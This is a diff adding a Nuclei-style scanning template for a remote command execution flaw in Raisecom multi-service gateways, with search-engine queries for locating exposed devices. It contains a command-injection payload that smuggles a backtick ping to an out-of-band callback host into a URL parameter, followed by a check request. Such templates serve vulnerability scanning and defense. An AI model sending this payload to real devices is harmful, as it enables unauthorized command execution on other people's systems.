@@ -1,0 +1,40 @@
+id: Raisecom_gateway_list_service_manage_RCE
+
+info:
+  name: Raisecom_gateway_list_service_manage_RCE
+  author: HK
+  severity: critical
+  description: 瑞斯康达-多业务智能网关list_service_manage.php存在远程命令执行漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/images/raisecom/back.gif"
+    Quake-query: body="/images/raisecom/back.gif"
+    Hunter-query: body="/images/raisecom/back.gif"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    POST /vpn/list_service_manage.php?template=%60ping+{{interactsh-url}}%60 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Length: 19
+
+    Nradius_submit=true
+
+  - |+
+    @timeout: 30s
+    GET /tmp/test.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  max-redirects: 3
+  cookie-reuse: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - php.ini
